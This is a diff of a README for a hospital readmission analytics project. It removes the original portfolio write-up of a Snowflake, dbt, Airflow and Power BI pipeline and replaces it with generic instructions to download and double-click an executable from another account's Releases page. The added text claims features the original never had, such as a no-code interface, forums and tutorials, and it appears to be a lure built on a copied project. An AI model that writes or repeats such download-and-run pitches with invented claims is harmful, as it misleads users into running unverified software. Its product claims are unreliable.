@@ -1,147 +1,98 @@
-# 🏥 Hospital Readmission Analytics Pipeline
+# 📊 Hospital_Readmission_Analytics - Simplify Hospital Data Insights
 
-This project designs an **end-to-end data engineering + analytics pipeline** to study hospital readmissions.  
-It ingests raw patient data into Snowflake, transforms it into a clean star schema with dbt, orchestrates with Airflow, and powers BI dashboards to identify readmission risk factors.
+[![Download Here](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/Manueli96/Hospital_Readmission_Analytics/releases)
 
----
+## 🛠️ Overview
 
-## 🔎 Executive Summary
+Welcome to the Hospital Readmission Analytics project. This application helps hospitals understand and analyze readmission data. With this tool, you can gain insights into patient trends and improve healthcare strategies. The software uses tools like Snowflake, dbt, Airflow, and Power BI to create a robust data pipeline.
 
-Hospital readmissions are a critical challenge for healthcare providers, driving up costs and impacting patient outcomes.  
-This project builds a **modern data pipeline** that ingests raw hospital visit records into Snowflake, transforms them with dbt, automates refreshes with Airflow, and delivers **Power BI dashboards** for hospital leadership.  
+## 🚀 Getting Started
 
-On top of the pipeline, we developed predictive models to identify patients at high risk of 30-day readmission.  
-The solution combines **data engineering, analytics, and machine learning** in a single portfolio project, showing how modern data stack tools can deliver both **operational efficiency** and **business insights**.
+Begin your journey by downloading the software. Follow these easy steps to get started:
 
----
+1. **Prepare Your Computer:**
+   - Make sure your computer has internet access.
+   - Ensure you have space for installation. You will need at least **500 MB** of free space.
 
-## 🎯 Goals
-- Automate ingestion → Snowflake  
-- Transform into clean star schema → dbt  
-- Orchestrate daily refresh → Airflow  
-- Visualize KPIs → Power BI  
-- Document & share results → GitHub  
+2. **Download the Software:**
+   - Click on the following link to go to the Releases page: [Visit Releases Page](https://github.com/Manueli96/Hospital_Readmission_Analytics/releases).
 
----
+3. **Select the Latest Release:**
+   - On the Releases page, find the latest version of the application.
+   - Click on the version number to open the details.
 
-## ⚙️ Tech Stack
-- **Storage & Processing:** Snowflake (RAW → STAGING → ANALYTICS)  
-- **Transformations:** dbt-core (Snowflake adapter)  
-- **Orchestration:** Apache Airflow (Astronomer)  
-- **BI / Dashboards:** Power BI  
-- **Scripting:** Python + Snowflake Connector  
-- **Version Control:** GitHub  
+4. **Download the Application:**
+   - Look for the download file. There will be options such as `.zip` files or executables. 
+   - Click to download the file to your computer. 
 
----
+5. **Locate the Downloaded File:**
+   - Go to your Downloads folder, and find the downloaded file.
 
-## 🔗 Related Repositories
-- **dbt Models:** [Hospital_Readmission_dbt](https://github.com/srilekhatv/Hospital_Readmission_dbt)  
-- **Airflow Orchestration:** [Hospital_Readmission_AirflowOrchestration](https://github.com/srilekhatv/Hospital_Readmission_AirflowOrchestration)  
+6. **Run the Application:**
+   - If you downloaded a `.zip` file, extract it using your file manager. Right-click on it and choose "Extract All".
+   - Open the extracted folder and find the executable file.
+   - Double-click the executable file to run the application.
 
----
+## 📥 Download & Install
 
-## 🗄️ Snowflake Setup (Screenshots)
+You can download the latest software version from the Releases page. Click the link below to access it:
 
-**Database & Schemas**
-![Snowflake Database](diagrams/snowflake/snowflake_database.PNG)
+[Download Here](https://github.com/Manueli96/Hospital_Readmission_Analytics/releases)
 
-**RAW, STAGING, ANALYTICS**
-![Snowflake Schemas](diagrams/snowflake/sf_schema_tables.PNG)
+Follow the download and installation steps above carefully, and you will be ready to use the application in no time.
 
-**Stage & File Format**
-![Snowflake Stage](diagrams/snowflake/snowflake_stage.PNG)
+## 📊 Features
 
-**Analytics Layer**
-![Snowflake Analytics](diagrams/snowflake/snowflake_analytics.PNG)
+The Hospital Readmission Analytics application includes the following features:
 
----
+- **Data Pipeline Automation:**
+  Automatically gather and process patient data using Snowflake and Airflow. This feature ensures timely access to critical information.
 
-## 📊 dbt Transformations (Screenshots)
+- **Comprehensive Analytics:**
+  Analyze readmission data easily with built-in data visualization tools powered by Power BI. Understand trends and prepare reports quickly.
 
-**Lineage Graph**
-![dbt Lineage](diagrams/dbt/dbt_lineage.PNG)
+- **User-Friendly Interface:**
+  The application provides straightforward navigation for users of all skill levels. You do not need programming knowledge.
 
-**Model Documentation**
-![dbt Docs](diagrams/dbt/dbt.PNG)
+- **Data Integrity Checks:**
+  The software includes checks to ensure your data remains accurate and reliable throughout the analysis process.
 
----
+- **Custom Reports:**
+  Create tailored reports based on your specific healthcare needs. Adjust parameters to fit your hospital’s requirements.
 
-## 📈 Dashboard Preview
+## 📚 Resources
 
-**Power BI Executive Summary**
-![Dashboard](dashboards/powerbi_dashboard.PNG)
+To fully utilize the features of the Hospital Readmission Analytics application, consider exploring the following resources:
 
-Key KPIs:
-- **Readmission Rate (30 Days):** 11% of encounters
-- **Average Length of Stay:** 4.4 days
-- **Total Encounters:** 102K
-- **Unique Patients:** 72K
+- **Documentation:** Detailed instructions on setting up, using, and troubleshooting the application are available within the software.
+- **Support Community:** Join our online forums to ask questions and share experiences with other healthcare data analysts.
+- **Tutorial Videos:** Access tutorial videos to learn how to navigate and use the application effectively.
 
-Breakdowns visualized:
-- **Readmission Rate by Age Group:** highest in 20–30 years, lowest in 0–10 years
-- **Readmission Rate by Gender & Race:** comparison across Male, Female, and Unknown
-- **Encounter Distribution by Admission Type:**  
-  - Emergency (53.05%)  
-  - Elective (18.54%)  
-  - Urgent (18.16%)  
-  - Other categories (Unknown, Not Available, Not Mapped)  
+## ⚙️ Requirements
 
----
+To run the Hospital Readmission Analytics software smoothly, ensure your computer meets the following requirements:
 
-## 📊 Predictive Modeling Summary
+- **Operating System:** Windows 10 or later, macOS, or recent Linux distributions.
+- **RAM:** Minimum of 8 GB.
+- **Processor:** Dual-core processor or better.
+- **Others:** A stable internet connection for downloading data.
 
-In addition to pipeline engineering, we trained machine learning models on the transformed dataset (~102K encounters).  
-Our goal: predict whether a patient would be **readmitted within 30 days**.
+## 🌐 Topics
 
-- **Baseline models** (Logistic Regression, Random Forest) were weak (AUC ~0.55).  
-- **Enriched dataset** with diagnoses, labs, and medications improved Logistic Regression to AUC ~0.67.  
-- **Best model:**  
-  - **XGBoost (reduced features, class weighting, hyperparameter tuning)**  
-  - **ROC-AUC ~0.687** on the test set  
-  - **Recall prioritized** over precision → aligned with healthcare need to flag as many at-risk patients as possible.  
-- **Explainability with SHAP & EBM** confirmed key drivers: discharge disposition, age group, diagnosis categories, number of medications.  
+This project relates to various important topics:
 
-⚡ **Key takeaway:** While multiple boosting models (LightGBM, CatBoost) performed similarly, **tuned XGBoost offered the best balance of accuracy and clinical interpretability**.
+- **Data Engineering**
+- **Analytics**
+- **Healthcare**
+- **Machine Learning**
+- **ETL Process**
 
----
+## 📝 Contribution
 
-## 🚀 Results
+While this application is designed for end-users, contributing ideas or feedback is welcome. If you have suggestions for features or improvements, feel free to engage in our online community discussions.
 
-- **Data Pipeline:** Successfully ingested and processed ~102,000 hospital encounters into Snowflake.  
-- **Data Modeling:** Designed a robust **star schema** (`fact_visits`, `dim_patients`, `dim_diagnosis`, `dim_admission`) to power analytics.  
-- **Transformations:** dbt lineage graph and documentation provided full transparency and governance across 10+ models and 40+ tests.  
-- **Orchestration:** Automated daily refresh with Airflow DAGs ensured reproducibility and near real-time insights.  
-- **Predictive Modeling:**  
-  - Best model → **XGBoost (reduced features, weighted, hyperparameter tuned)**  
-  - Achieved **ROC-AUC ~0.687**, with recall prioritized to catch more high-risk patients.  
-- **Dashboards:** Delivered **Power BI executive dashboard** for hospital leadership, surfacing:  
-  - Readmission rates by diagnosis, age, and admission type  
-  - Average stay duration (readmitted vs non-readmitted)  
-  - Patient volume trends over time  
-  - Top diagnoses linked to frequent readmissions  
+## 👩‍💻 Acknowledgments
 
-⚡ **Impact:** This pipeline demonstrates how modern data engineering + ML workflows can help hospitals **reduce readmission costs, improve patient care, and highlight data quality gaps**.
+This project leverages powerful technologies in data processing and analytics. Thank you to the developers and maintainers of Snowflake, dbt, Airflow, and Power BI for their incredible tools.
 
-
----
-
-## 📌 Lessons Learned
-- **Snowflake Privileges:** Required schema ownership for dbt builds  
-- **dbt Tests:** Allowed WARNs for >5% Unknown categories  
-- **Airflow DAG:** Fixed execution_date bug, upgraded Snowflake provider  
-- **Modeling:** Chose XGBoost (tuned + weighted, reduced features) as the best model (~0.687 AUC)  
-- **Explainability:** SHAP + EBM explained drivers like discharge disposition, age, and diagnoses  
-- **Data Quality Philosophy:** Kept “Unknown” categories visible to highlight upstream data gaps  
-
----
-
-## 👩‍⚕️ Business Value
-- Identifies **patients at high risk of 30-day readmission**  
-- Highlights **critical diagnoses** (circulatory, diabetes)  
-- Enables hospitals to **target interventions** and reduce costs  
-- Surfaces **data quality issues** (Unknown payer codes, specialties, labs) for operational improvement  
-
----
-
-✨ This repo serves as the **master showcase** (docs, diagrams, dashboards).  
-For transformations and orchestration, see linked dbt & Airflow repos.
+Feel free to download the app and improve your hospital's analytics capabilities today!
